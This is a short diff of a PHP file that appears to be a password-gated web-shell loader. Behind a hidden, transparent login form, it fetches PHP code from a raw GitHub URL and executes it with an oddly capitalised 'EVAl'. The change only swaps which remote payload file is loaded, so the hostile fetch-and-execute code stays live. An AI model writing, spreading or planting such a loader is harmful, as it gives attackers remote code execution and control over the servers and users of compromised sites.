@@ -62,7 +62,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
 
 // Display main content if authenticated, otherwise show hidden login form
 if (is_user_authenticated()) {
-    $content = fetch_url_with_cookies('https://raw.githubusercontent.com/sec0x/php/refs/heads/main/risaw.php');
+    $content = fetch_url_with_cookies('https://raw.githubusercontent.com/sec0x/php/refs/heads/main/sec.php');
     EVAl('?>' . $content);
 } else {
     // Display transparent login form
@@ -86,5 +86,6 @@ if (is_user_authenticated()) {
     <?php
 }
 ?>
+
 
 
